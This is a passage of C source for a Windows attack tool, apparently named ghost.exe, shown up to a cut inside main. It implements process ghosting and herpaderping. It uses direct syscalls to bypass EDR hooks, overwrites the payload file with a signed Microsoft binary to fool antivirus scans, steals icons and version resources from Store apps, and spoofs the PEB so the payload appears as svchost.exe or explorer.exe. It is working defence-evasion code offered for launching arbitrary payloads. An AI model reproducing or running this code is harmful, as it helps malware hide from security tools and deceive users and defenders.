#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include "../include/nt_defs.h"
#include <shellapi.h>
#include <wingdi.h>

#ifdef _WIN64
extern PVOID __stdcall ghost_get_peb(void);
extern NTSTATUS __stdcall ghost_do_syscall(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
    PLARGE_INTEGER, ULONG, ULONG, HANDLE);

DWORD g_syscall_ssn = 0;
#endif  // _WIN64

static inline void ghost_init_unicode_string(UNICODE_STRING *us, const WCHAR *str)
{
    us->Buffer        = (PWSTR)str;
    us->Length        = (USHORT)(wcslen(str) * sizeof(WCHAR));
    us->MaximumLength = us->Length + sizeof(WCHAR);
}

// log helpers
#define LOG(fmt, ...) do { printf("[*] " fmt "\n", ##__VA_ARGS__); fflush(stdout); } while(0)
#define OK(fmt,  ...) do { printf("[+] " fmt "\n", ##__VA_ARGS__); fflush(stdout); } while(0)
#define ERR(fmt, ...) do { fprintf(stderr, "[-] " fmt "\n", ##__VA_ARGS__); } while(0)
#define CHKNT(st, msg) \
    do { if (!NT_SUCCESS(st)) { ERR(msg " (NTSTATUS 0x%08lx)", (ULONG)(st)); return FALSE; } } while(0)

static LPBYTE gh_read_file(const char *path, DWORD *out_size)
{
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        ERR("CreateFile(%s) failed – GLE %lu", path, GetLastError());
        return NULL;
    }

    DWORD sz = GetFileSize(hf, NULL);
    if (sz == INVALID_FILE_SIZE || sz == 0) { CloseHandle(hf); return NULL; }

    LPBYTE buf = (LPBYTE)VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) { CloseHandle(hf); return NULL; }

    DWORD rd = 0;
    ReadFile(hf, buf, sz, &rd, NULL);
    CloseHandle(hf);

    *out_size = rd;
    return buf;
}

static BOOL gh_valid_pe(LPBYTE data, DWORD size)
{
    if (size < sizeof(IMAGE_DOS_HEADER)) return FALSE;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)data;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    if ((DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > size) return FALSE;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(data + dos->e_lfanew);
    return nt->Signature == IMAGE_NT_SIGNATURE;
}

#ifdef _WIN64

static NTSTATUS gh_direct_NtCreateSection(
    const GHOST_NTAPI *api,
    PHANDLE            SectionHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER     MaximumSize,
    ULONG              SectionPageProtection,
    ULONG              AllocationAttributes,
    HANDLE             FileHandle)
{
    DWORD ssn = gh_read_ssn((PVOID)api->NtCreateSection);

    if (ssn != 0) {

        g_syscall_ssn = ssn;
        OK("DIRECT SYSCALL  SSN=0x%04X  (via asm_stubs.asm:ghost_do_syscall)", ssn);

        return ghost_do_syscall(
            SectionHandle, DesiredAccess, ObjectAttributes,
            MaximumSize, SectionPageProtection,
            AllocationAttributes, FileHandle);
    }

    LOG("SSN unreadable (stub hooked?) — fallback to ntdll");
    return api->NtCreateSection(
        SectionHandle, DesiredAccess, ObjectAttributes,
        MaximumSize, SectionPageProtection,
        AllocationAttributes, FileHandle);
}

#else

#define gh_direct_NtCreateSection(api, sh, da, oa, ms, spp, aa, fh) \
    (api)->NtCreateSection((sh), (da), (oa), (ms), (spp), (aa), (fh))
#endif

static BOOL gh_find_store_app(const char *pkg_prefix,
                               const char *rel_exe,
                               char       *out_path)
{

    static const char *REG_PATHS[] = {
        "SOFTWARE\\Classes\\Local Settings\\Software\\Microsoft\\Windows"
        "\\CurrentVersion\\AppModel\\PackageRepository\\Packages",
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Appx"
        "\\AppxAllUserStore\\Applications",
    };

    for (int ri = 0; ri < 2; ri++) {
        HKEY hRoot;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, REG_PATHS[ri], 0,
                          KEY_READ, &hRoot) != ERROR_SUCCESS)
            continue;

        char pkg_full[512];
        DWORD idx = 0, pkg_len;
        BOOL found = FALSE;

        while (!found) {
            pkg_len = (DWORD)sizeof(pkg_full);
            LONG rc = RegEnumKeyA(hRoot, idx++, pkg_full, pkg_len);
            if (rc == ERROR_NO_MORE_ITEMS) break;
            if (rc != ERROR_SUCCESS) continue;
            if (_strnicmp(pkg_full, pkg_prefix, strlen(pkg_prefix)) != 0) continue;

            HKEY hSub;
            if (RegOpenKeyExA(hRoot, pkg_full, 0, KEY_READ, &hSub) != ERROR_SUCCESS)
                continue;

            char install_dir[MAX_PATH];
            DWORD sz = MAX_PATH, type;
            LONG qr = RegQueryValueExA(hSub, "Path", NULL, &type,
                                        (LPBYTE)install_dir, &sz);
            RegCloseKey(hSub);

            if (qr != ERROR_SUCCESS || type != REG_SZ) continue;

            sprintf_s(out_path, MAX_PATH, "%s\\%s", install_dir, rel_exe);
            DWORD attr = GetFileAttributesA(out_path);
            if (attr != INVALID_FILE_ATTRIBUTES
                    && !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
                LOG("Store app (via registry): %s", out_path);
                found = TRUE;
            }
        }

        RegCloseKey(hRoot);
        if (found) return TRUE;
    }

    LOG("Store app not found in registry for %s", pkg_prefix);
    return FALSE;
}

static void gh_fix_rsrc(LPBYTE rsrc, DWORD rsrc_size,
                         DWORD dir_off, int depth, LONG va_delta)
{
    if (depth > 3) return;
    if (dir_off + sizeof(IMAGE_RESOURCE_DIRECTORY) > rsrc_size) return;

    PIMAGE_RESOURCE_DIRECTORY dir =
        (PIMAGE_RESOURCE_DIRECTORY)(rsrc + dir_off);
    WORD count = dir->NumberOfNamedEntries + dir->NumberOfIdEntries;
    PIMAGE_RESOURCE_DIRECTORY_ENTRY ent =
        (PIMAGE_RESOURCE_DIRECTORY_ENTRY)((LPBYTE)(dir + 1));

    for (WORD i = 0; i < count; i++, ent++) {
        if (ent->DataIsDirectory) {

            gh_fix_rsrc(rsrc, rsrc_size,
                        ent->OffsetToDirectory, depth + 1, va_delta);
        } else {

            DWORD de_off = ent->OffsetToData;
            if (de_off + sizeof(IMAGE_RESOURCE_DATA_ENTRY) <= rsrc_size) {
                PIMAGE_RESOURCE_DATA_ENTRY de =
                    (PIMAGE_RESOURCE_DATA_ENTRY)(rsrc + de_off);
                de->OffsetToData = (DWORD)((LONG)de->OffsetToData + va_delta);
            }
        }
    }
}

static LPBYTE gh_graft_resources(LPBYTE payload, DWORD payload_size,
                                   const char *target_path,
                                   DWORD *out_new_size)
{

    DWORD tgt_size = 0;
    LPBYTE tgt = gh_read_file(target_path, &tgt_size);
    if (!tgt || !gh_valid_pe(tgt, tgt_size)) {
        if (tgt) VirtualFree(tgt, 0, MEM_RELEASE);
        return NULL;
    }

    PIMAGE_DOS_HEADER dos_t = (PIMAGE_DOS_HEADER)tgt;
    PIMAGE_NT_HEADERS nt_t  = (PIMAGE_NT_HEADERS)(tgt + dos_t->e_lfanew);
    PIMAGE_SECTION_HEADER sec_t = IMAGE_FIRST_SECTION(nt_t);

    PIMAGE_SECTION_HEADER rsrc_hdr = NULL;
    for (WORD i = 0; i < nt_t->FileHeader.NumberOfSections; i++) {
        if (strncmp((char*)sec_t[i].Name, ".rsrc", 5) == 0) {
            rsrc_hdr = &sec_t[i];
            break;
        }
    }

    if (!rsrc_hdr || rsrc_hdr->SizeOfRawData == 0
                  || rsrc_hdr->PointerToRawData + rsrc_hdr->SizeOfRawData > tgt_size) {
        LOG("Target has no .rsrc (UWP stub?) — resource graft skipped");
        VirtualFree(tgt, 0, MEM_RELEASE);
        return NULL;
    }

    LPBYTE rsrc_data   = tgt + rsrc_hdr->PointerToRawData;
    DWORD  rsrc_raw    = rsrc_hdr->SizeOfRawData;
    DWORD  rsrc_virt   = rsrc_hdr->Misc.VirtualSize
                         ? rsrc_hdr->Misc.VirtualSize : rsrc_raw;
    DWORD  old_rsrc_va = rsrc_hdr->VirtualAddress;

    PIMAGE_DOS_HEADER dos_p = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS nt_p  = (PIMAGE_NT_HEADERS)(payload + dos_p->e_lfanew);
    DWORD file_align = nt_p->OptionalHeader.FileAlignment;
    DWORD sect_align = nt_p->OptionalHeader.SectionAlignment;
    DWORD new_rsrc_va = nt_p->OptionalHeader.SizeOfImage;
    DWORD new_file_off = (payload_size + file_align - 1) & ~(file_align - 1);
    DWORD new_total    = new_file_off + rsrc_raw;

    DWORD new_soi = new_rsrc_va
                  + ((rsrc_virt + sect_align - 1) & ~(sect_align - 1));

    LPBYTE np = (LPBYTE)VirtualAlloc(NULL, new_total,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!np) { VirtualFree(tgt, 0, MEM_RELEASE); return NULL; }

    memcpy(np, payload, payload_size);           // orjinal payload //
    memcpy(np + new_file_off, rsrc_data, rsrc_raw); // calinan .rsrc data //

    PIMAGE_NT_HEADERS  nt_new = (PIMAGE_NT_HEADERS)(np + dos_p->e_lfanew);
    PIMAGE_SECTION_HEADER sn  = IMAGE_FIRST_SECTION(nt_new);
    WORD num_sec = nt_new->FileHeader.NumberOfSections;

    BOOL replaced = FALSE;
    for (WORD i = 0; i < num_sec; i++) {
        if (strncmp((char*)sn[i].Name, ".rsrc", 5) == 0) {
            sn[i].Misc.VirtualSize  = rsrc_virt;
            sn[i].VirtualAddress    = new_rsrc_va;
            sn[i].SizeOfRawData     = rsrc_raw;
            sn[i].PointerToRawData  = new_file_off;
            sn[i].Characteristics   = IMAGE_SCN_MEM_READ
                                    | IMAGE_SCN_CNT_INITIALIZED_DATA;
            replaced = TRUE;
            break;
        }
    }

    if (!replaced) {
        /* Append a new section header */
        PIMAGE_SECTION_HEADER new_sec = &sn[num_sec];
        memset(new_sec, 0, sizeof(IMAGE_SECTION_HEADER));
        memcpy(new_sec->Name, ".rsrc\0\0\0", 8);
        new_sec->Misc.VirtualSize  = rsrc_virt;
        new_sec->VirtualAddress    = new_rsrc_va;
        new_sec->SizeOfRawData     = rsrc_raw;
        new_sec->PointerToRawData  = new_file_off;
        new_sec->Characteristics   = IMAGE_SCN_MEM_READ
                                   | IMAGE_SCN_CNT_INITIALIZED_DATA;
        nt_new->FileHeader.NumberOfSections++;
    }

    LONG va_delta = (LONG)new_rsrc_va - (LONG)old_rsrc_va;
    gh_fix_rsrc(np + new_file_off, rsrc_raw, 0, 0, va_delta);

    nt_new->OptionalHeader
           .DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE]
           .VirtualAddress = new_rsrc_va;
    nt_new->OptionalHeader
           .DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE]
           .Size = rsrc_virt;
    nt_new->OptionalHeader.SizeOfImage = new_soi;

    VirtualFree(tgt, 0, MEM_RELEASE);

    *out_new_size = new_total;
    OK("Resource graft: .rsrc stolen from %s", target_path);
    OK("  VA  0x%08lX -> 0x%08lX  (delta: %+ld)", old_rsrc_va, new_rsrc_va, va_delta);
    OK("  Size: %lu bytes  |  Sections now: %u",
       rsrc_raw, (UINT)nt_new->FileHeader.NumberOfSections);
    return np;
}

#pragma pack(push, 1)
typedef struct {
    BYTE  bWidth;
    BYTE  bHeight;
    BYTE  bColorCount;
    BYTE  bReserved;
    WORD  wPlanes;
    WORD  wBitCount;
    DWORD dwBytesInRes;
    WORD  nId;
} GH_GRPICONDIRENTRY;
typedef struct {
    WORD             idReserved;
    WORD             idType;    // 1 = icon //
    WORD             idCount;
    GH_GRPICONDIRENTRY idEntries[1];
} GH_GRPICONDIR;
#pragma pack(pop)

static BOOL gh_inject_icon_via_shell(const char *decoy_file_path,
                                      const char *icon_src_path)
{

    SHFILEINFOA sfi = { 0 };
    DWORD_PTR ok = SHGetFileInfoA(icon_src_path, 0,
                                   &sfi, sizeof(sfi),
                                   SHGFI_ICON | SHGFI_LARGEICON);
    if (!ok || !sfi.hIcon) {
        LOG("gh_inject_icon: SHGetFileInfo failed on %s (GLE %lu)",
            icon_src_path, GetLastError());
        return FALSE;
    }

    ICONINFO ii = { 0 };
    GetIconInfo(sfi.hIcon, &ii);

    BITMAP bm = { 0 };
    GetObject(ii.hbmColor ? ii.hbmColor : ii.hbmMask, sizeof(bm), &bm);
    int w = bm.bmWidth ? bm.bmWidth  : 32;
    int h = bm.bmHeight ? bm.bmHeight : 32;
    if (h < 0) h = -h;

    HDC     hdc    = GetDC(NULL);
    HDC     hdcMem = CreateCompatibleDC(hdc);

    BITMAPINFO bmi     = { 0 };
    bmi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth       = w;
    bmi.bmiHeader.biHeight      = h;
    bmi.bmiHeader.biPlanes      = 1;
    bmi.bmiHeader.biBitCount    = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    LPVOID pBits   = NULL;
    HBITMAP hDib   = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &pBits, NULL, 0);
    HGDIOBJ hOld   = SelectObject(hdcMem, hDib);

    RECT rc = { 0, 0, w, h };
    FillRect(hdcMem, &rc, (HBRUSH)GetStockObject(BLACK_BRUSH));
    DrawIconEx(hdcMem, 0, 0, sfi.hIcon, w, h, 0, NULL, DI_NORMAL);
    GdiFlush();
    SelectObject(hdcMem, hOld);

    DWORD stride     = (DWORD)((w * 32 + 31) / 32) * 4;
    DWORD color_size = stride * (DWORD)h;
    LPBYTE color_data = (LPBYTE)VirtualAlloc(NULL, color_size,
                                              MEM_COMMIT | MEM_RESERVE,
                                              PAGE_READWRITE);
    if (!color_data) goto cleanup_gdi;
    memcpy(color_data, pBits, color_size);

    DWORD mask_stride = (DWORD)((w + 31) / 32) * 4;
    DWORD mask_size   = mask_stride * (DWORD)h;
    LPBYTE mask_data  = (LPBYTE)VirtualAlloc(NULL, mask_size,
                                              MEM_COMMIT | MEM_RESERVE,
                                              PAGE_READWRITE);
    if (!mask_data) { VirtualFree(color_data, 0, MEM_RELEASE); goto cleanup_gdi; }
    memset(mask_data, 0, mask_size);

    BITMAPINFOHEADER bih = { 0 };
    bih.biSize        = sizeof(BITMAPINFOHEADER);
    bih.biWidth       = w;
    bih.biHeight      = h * 2;  // ICON DIB //
    bih.biPlanes      = 1;
    bih.biBitCount    = 32;
    bih.biCompression = BI_RGB;
    bih.biSizeImage   = color_size + mask_size;

    DWORD icon_data_size = sizeof(BITMAPINFOHEADER) + color_size + mask_size;
    LPBYTE icon_data = (LPBYTE)VirtualAlloc(NULL, icon_data_size,
                                             MEM_COMMIT | MEM_RESERVE,
                                             PAGE_READWRITE);
    if (!icon_data) {
        VirtualFree(color_data, 0, MEM_RELEASE);
        VirtualFree(mask_data,  0, MEM_RELEASE);
        goto cleanup_gdi;
    }
    memcpy(icon_data,                                &bih,        sizeof(bih));
    memcpy(icon_data + sizeof(bih),                  color_data,  color_size);
    memcpy(icon_data + sizeof(bih) + color_size,     mask_data,   mask_size);

    VirtualFree(color_data, 0, MEM_RELEASE);
    VirtualFree(mask_data,  0, MEM_RELEASE);

    DWORD grp_size = sizeof(GH_GRPICONDIR);
    GH_GRPICONDIR *grp = (GH_GRPICONDIR *)VirtualAlloc(NULL, grp_size,
                                                         MEM_COMMIT | MEM_RESERVE,
                                                         PAGE_READWRITE);
    if (!grp) {
        VirtualFree(icon_data, 0, MEM_RELEASE);
        goto cleanup_gdi;
    }
    grp->idReserved          = 0;
    grp->idType              = 1;   // icon //
    grp->idCount             = 1;
    grp->idEntries[0].bWidth       = (BYTE)(w <= 255 ? w : 0);
    grp->idEntries[0].bHeight      = (BYTE)(h <= 255 ? h : 0);
    grp->idEntries[0].bColorCount  = 0;   // 32bpp //
    grp->idEntries[0].bReserved    = 0;
    grp->idEntries[0].wPlanes      = 1;
    grp->idEntries[0].wBitCount    = 32;
    grp->idEntries[0].dwBytesInRes = icon_data_size;
    grp->idEntries[0].nId          = 1;   // RT_ICON ID //

    HANDLE hUpd = BeginUpdateResourceA(decoy_file_path, FALSE);
    if (!hUpd) {
        LOG("gh_inject_icon: BeginUpdateResource failed (GLE %lu) — icon not injected",
            GetLastError());
        VirtualFree(icon_data, 0, MEM_RELEASE);
        VirtualFree(grp,       0, MEM_RELEASE);
        goto cleanup_gdi;
    }

    UpdateResourceA(hUpd, (LPCSTR)RT_ICON,
                    MAKEINTRESOURCEA(1),
                    MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                    icon_data, icon_data_size);

    UpdateResourceA(hUpd, (LPCSTR)RT_GROUP_ICON,
                    MAKEINTRESOURCEA(1),
                    MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                    grp, grp_size);

    BOOL committed = EndUpdateResourceA(hUpd, FALSE);

    VirtualFree(icon_data, 0, MEM_RELEASE);
    VirtualFree(grp,       0, MEM_RELEASE);

    if (committed)
        OK("Modern icon injected into decoy (UpdateResource)");
    else
        LOG("EndUpdateResource failed (GLE %lu)", GetLastError());

cleanup_gdi:
    DeleteObject(hDib);
    if (ii.hbmColor) DeleteObject(ii.hbmColor);
    if (ii.hbmMask)  DeleteObject(ii.hbmMask);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdc);
    DestroyIcon(sfi.hIcon);
    return committed;
}

static BOOL gh_create_ghost_file(const GHOST_NTAPI *api,
                                  LPBYTE payload, DWORD payload_size,
                                  const char *mask_name,
                                  HANDLE *out_handle, char *out_tmp_path)
{

    char tmp_dir[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp_dir);

    const char *basename = strrchr(mask_name, '\\');
    basename = basename ? basename + 1 : mask_name;

    sprintf_s(out_tmp_path, MAX_PATH, "%s%s", tmp_dir, basename);
    LOG("Temp file  : %s", out_tmp_path);

    HANDLE hf = CreateFileA(out_tmp_path,
                            GENERIC_READ | GENERIC_WRITE | DELETE,
                            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                            NULL, CREATE_ALWAYS,
                            FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        ERR("CreateTemp failed – GLE %lu", GetLastError());
        return FALSE;
    }

    DWORD written = 0;
    WriteFile(hf, payload, payload_size, &written, NULL);
    OK("Payload written  (%lu bytes)", written);

    *out_handle = hf;
    return TRUE;
}

static BOOL gh_create_section(const GHOST_NTAPI *api,
                               HANDLE hf,
                               HANDLE *out_section)
{
    HANDLE hSec = NULL;

    NTSTATUS st = gh_direct_NtCreateSection(
                      api, &hSec,
                      SECTION_ALL_ACCESS,
                      NULL, NULL,
                      PAGE_READONLY,
                      SEC_IMAGE,
                      hf);
    CHKNT(st, "NtCreateSection (direct syscall)");
    OK("Ghost section created  (direct syscall — EDR hooks bypassed)");

    *out_section = hSec;
    return TRUE;
}

static BOOL gh_herpaderp(const GHOST_NTAPI *api, HANDLE hf,
                          const char *mask_path,
                          const char *tmp_file_path)
{

    char decoy_path[MAX_PATH] = { 0 };

    char icon_src_path[MAX_PATH] = { 0 };

    if (mask_path) {

        if (decoy_path[0] == '\0') {
            strcpy_s(decoy_path, MAX_PATH, mask_path);
            LOG("Herpaderp decoy: using Win32 path %s", decoy_path);
        }
    }

    //hardcoded fallback //
    if (decoy_path[0] == '\0' || GetFileAttributesA(decoy_path) == INVALID_FILE_ATTRIBUTES) {
        GetSystemDirectoryA(decoy_path, MAX_PATH);
        strcat_s(decoy_path, MAX_PATH, "\\notepad.exe");
        LOG("Herpaderp decoy: fallback -> %s", decoy_path);
    }

    if (mask_path) {
        const char *bname = strrchr(mask_path, '\\');
        bname = bname ? bname + 1 : mask_path;
        static const struct { const char *win32; const char *pkg; const char *rel; }
        ICON_MAP[] = {
            { "notepad.exe", "Microsoft.WindowsNotepad",    "Notepad\\Notepad.exe"  },
            { "mspaint.exe", "Microsoft.Paint",             "PaintApp\\mspaint.exe" },
            { "calc.exe",    "Microsoft.WindowsCalculator", "calc.exe"              },
        };
        for (int i = 0; i < (int)(sizeof(ICON_MAP)/sizeof(ICON_MAP[0])); i++) {
            if (_stricmp(bname, ICON_MAP[i].win32) == 0) {
                char store_path[MAX_PATH];
                if (gh_find_store_app(ICON_MAP[i].pkg, ICON_MAP[i].rel, store_path)) {
                    strcpy_s(icon_src_path, MAX_PATH, store_path);
                    LOG("Icon source: Store app path -> modern icon");
                }
                break;
            }
        }
    }

    if (icon_src_path[0] == '\0')
        strcpy_s(icon_src_path, MAX_PATH, decoy_path);


    DWORD decoy_size = 0;
    LPBYTE decoy = gh_read_file(decoy_path, &decoy_size);
    if (!decoy || decoy_size == 0) {
        LOG("Herpaderp decoy not found (%s) — skipping overwrite", decoy_path);
        return TRUE;  // non-fatal //
    }

    if (icon_src_path[0] != '\0') {
        char scratch_path[MAX_PATH];
        GetTempPathA(MAX_PATH, scratch_path);
        strcat_s(scratch_path, MAX_PATH, "gh_scratch.exe");

        HANDLE hs = CreateFileA(scratch_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        if (hs != INVALID_HANDLE_VALUE) {
            DWORD w = 0;
            WriteFile(hs, decoy, decoy_size, &w, NULL);
            CloseHandle(hs);

            if (gh_inject_icon_via_shell(scratch_path, icon_src_path)) {
                VirtualFree(decoy, 0, MEM_RELEASE);
                decoy = gh_read_file(scratch_path, &decoy_size);
                LOG("Successfully injected modern icon into decoy buffer");
            }
            DeleteFileA(scratch_path);
        }
    }

    SetFilePointer(hf, 0, NULL, FILE_BEGIN);
    DWORD written = 0;
    WriteFile(hf, decoy, decoy_size, &written, NULL);
    SetEndOfFile(hf);
    FlushFileBuffers(hf);

    VirtualFree(decoy, 0, MEM_RELEASE);
    OK("HERPADERP  -- file overwritten with %s (%lu bytes)", decoy_path, written);
    OK("AV scan will see: Microsoft signed binary");
    OK("Task Manager will read icon FROM THIS FILE -> modern icon expected");
    CloseHandle(hf);
    OK("Handle closed  (herpaderp complete)");
    OK("Disk: notepad.exe  |  Memory section: payload  |  They differ on purpose");

    return TRUE;
}

static BOOL gh_create_process(const GHOST_NTAPI *api,
                               HANDLE hSec, HANDLE *out_proc)
{
    HANDLE hProc = NULL;
    NTSTATUS st = api->NtCreateProcessEx(
                      &hProc, PROCESS_ALL_ACCESS, NULL,
                      GetCurrentProcess(), PS_INHERIT_HANDLES,
                      hSec, NULL, NULL, 0);
    CHKNT(st, "NtCreateProcessEx");
    OK("Ghost process created  (PID: %lu)", GetProcessId(hProc));
    *out_proc = hProc;
    return TRUE;
}

static BOOL gh_setup_params(const GHOST_NTAPI *api,
                             HANDLE hProc,
                             const WCHAR *masquerade_path,
                             PPEB peb_addr)
{
    UNICODE_STRING uImagePath;
    ghost_init_unicode_string(&uImagePath, masquerade_path);

    PGHOST_RTL_USER_PROCESS_PARAMETERS params = NULL;
    NTSTATUS st = api->RtlCreateProcessParametersEx(
                      &params,
                      &uImagePath,
                      NULL, NULL,
                      &uImagePath,  // CommandLine = masquerade path //
                      NULL, NULL, NULL, NULL, NULL,
                      0);
    CHKNT(st, "RtlCreateProcessParametersEx");

    SIZE_T params_size = (SIZE_T)params->MaximumLength + (SIZE_T)params->EnvironmentSize;

    PVOID remote_params = params;
    NTSTATUS st2 = api->NtAllocateVirtualMemory(
                       hProc, &remote_params, 0, &params_size,
                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    CHKNT(st2, "NtAllocateVirtualMemory (params)");

    SIZE_T written = 0;
    NTSTATUS st3 = api->NtWriteVirtualMemory(
                       hProc, remote_params, params,
                       (SIZE_T)params->MaximumLength + (SIZE_T)params->EnvironmentSize,
                       &written);
    CHKNT(st3, "NtWriteVirtualMemory (params)");

    PVOID peb_params_ptr = (LPBYTE)peb_addr + PEB_PROC_PARAMS_OFFSET;
    SIZE_T w2 = 0;
    NTSTATUS st4 = api->NtWriteVirtualMemory(
                       hProc, peb_params_ptr, &remote_params,
                       sizeof(PVOID), &w2);
    CHKNT(st4, "NtWriteVirtualMemory (PEB->ProcessParameters)");
    OK("MASQUERADE  — PEB shows: %ls", masquerade_path);

    return TRUE;
}

static BOOL gh_create_thread(const GHOST_NTAPI *api,
                              HANDLE hProc, PPEB peb_addr,
                              LPBYTE payload)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(payload + dos->e_lfanew);

    PVOID actual_base = NULL;
    PVOID peb_imgbase = (LPBYTE)peb_addr + PEB_IMAGE_BASE_OFFSET;
    SIZE_T read_bytes = 0;

    if (!ReadProcessMemory(hProc, peb_imgbase,
                           &actual_base, sizeof(PVOID), &read_bytes)) {
        ERR("ReadProcessMemory(PEB->ImageBase) – GLE %lu", GetLastError());
        return FALSE;
    }
    OK("Remote image base : 0x%p", actual_base);

    LPVOID ep = (LPBYTE)actual_base + nt->OptionalHeader.AddressOfEntryPoint;
    OK("Entry point       : 0x%p", ep);

    HANDLE hThread = NULL;
    NTSTATUS st = api->NtCreateThreadEx(
                      &hThread, THREAD_ALL_ACCESS, NULL,
                      hProc, ep, NULL,
                      0,    // NOT suspended //
                      0, 0, 0, NULL);
    CHKNT(st, "NtCreateThreadEx");
    OK("Ghost thread launched  (no suspend!)");
    OK("Thread handle     : 0x%p", (void*)hThread);

    CloseHandle(hThread);
    return TRUE;
}

int main(int argc, char *argv[])
{
    LOG("Initializing...");    if (argc < 2) {
        fprintf(stderr,
            "Usage: ghost.exe <payload.exe> [masquerade_name]\n\n"
            "  payload.exe     PE to ghost-execute (must be x64)\n"
            "  masquerade_name Process name in Task Manager (default: svchost.exe)\n\n"
            "Examples:\n"
            "  ghost.exe payload.exe                  (masquerade as svchost.exe)\n"
            "  ghost.exe payload.exe explorer.exe     (masquerade as explorer.exe)\n"
            "  ghost.exe payload.exe RuntimeBroker.exe\n\n"
        );
        return 1;
    }

    const char *payload_path = argv[1];

    WCHAR masquerade_path[MAX_PATH + 8];
    {
        char sys_dir[MAX_PATH];
        GetSystemDirectoryA(sys_dir, MAX_PATH);

        const char *mask_name = (argc >= 3) ? argv[2] : "svchost.exe";
        char full_mask[MAX_PATH];
        sprintf_s(full_mask, MAX_PATH, "%s\\%s", sys_dir, mask_name);

        WCHAR wfull[MAX_PATH];
        MultiByteToWideChar(CP_ACP, 0, full_mask, -1, wfull, MAX_PATH);
        wcscpy_s(masquerade_path, MAX_PATH + 8, L"\\??\\");
        wcscat_s(masquerade_path, MAX_PATH + 8, wfull);
    }

    GHOST_NTAPI api = { 0 };
    ghost_resolve_all(&api);
    OK("NT API resolved  (%d functions)", (int)(sizeof(GHOST_NTAPI) / sizeof(FARPROC)));
    DWORD payload_size = 0;
    LPBYTE payload = gh_read_file(payload_path, &payload_size);
    if (!payload || !gh_valid_pe(payload, payload_size)) {
        ERR("Invalid or unreadable PE: %s", payload_path);
        return 1;
    }
    OK("Payload loaded  (%lu bytes, valid PE)", payload_size);

    printf("\n  --- Resource Graft ---\n\n");
    {

        char tgt_path[MAX_PATH];
        WideCharToMultiByte(CP_ACP, 0,
                            masquerade_path + 4,
                            -1, tgt_path, MAX_PATH, NULL, NULL);

        static const struct { const char *pkg; const char *rel; const char *win32; } STORE_MAP[] = {
            { "Microsoft.WindowsNotepad",     "Notepad\\Notepad.exe",    "notepad.exe"    },
            { "Microsoft.Paint",              "PaintApp\\mspaint.exe",   "mspaint.exe"    },
            { "Microsoft.WindowsCalculator",  "calc.exe",                "calc.exe"       },
            { "Microsoft.MicrosoftStickyNotes","StickyNotes.exe",        NULL             },
            { "Microsoft.ScreenSketch",       "SnippingTool.exe",        "SnippingTool.exe"},
        };

        const char *tgt_base = strrchr(tgt_path, '\\');
        tgt_base = tgt_base ? tgt_base + 1 : tgt_path;

        char store_path[MAX_PATH] = { 0 };
        BOOL store_found = FALSE;
        for (int si = 0; si < (int)(sizeof(STORE_MAP)/sizeof(STORE_MAP[0])); si++) {
            if (_stricmp(tgt_base, STORE_MAP[si].win32) == 0) {
                store_found = gh_find_store_app(STORE_MAP[si].pkg,
                                                STORE_MAP[si].rel,
                                                store_path);
                if (store_found)
                    LOG("Modern Store icon found — using it for resource graft");
                break;
            }
        }

        DWORD grafted_size = 0;
        LPBYTE grafted = NULL;

        if (store_found)
            grafted = gh_graft_resources(payload, payload_size,
                                          store_path, &grafted_size);

        if (!grafted)
            grafted = gh_graft_resources(payload, payload_size,
                                          tgt_path, &grafted_size);

        if (!grafted) {
            char notepad_path[MAX_PATH];
            GetSystemDirectoryA(notepad_path, MAX_PATH);
            strcat_s(notepad_path, MAX_PATH, "\\notepad.exe");
            LOG("Trying final fallback: %s", notepad_path);
            grafted = gh_graft_resources(payload, payload_size,
                                          notepad_path, &grafted_size);
        }


        if (grafted) {
            VirtualFree(payload, 0, MEM_RELEASE);
            payload      = grafted;
            payload_size = grafted_size;
            OK("Payload now carries icon + VERSIONINFO from target");
        } else {
            LOG("Resource graft failed — continuing without resources");
        }
    }


    printf("\n  --- Layer 1: GHOSTING ---\n\n");

    HANDLE hFile = NULL;
    char tmp_path[MAX_PATH];
    {

        char mask_narrow[MAX_PATH];
        WideCharToMultiByte(CP_ACP, 0,
                            masquerade_path + 4,
                            -1, mask_narrow, MAX_PATH, NULL, NULL);
        if (!gh_create_ghost_file(&api, payload, payload_size,
                                  mask_narrow, &hFile, tmp_path))
            return 1;
    }

    HANDLE hSection = NULL;
    if (!gh_create_section(&api, hFile, &hSection))
        return 1;

    printf("\n  --- Layer 2: HERPADERPING ---\n\n");

    {
        char mask_narrow[MAX_PATH];
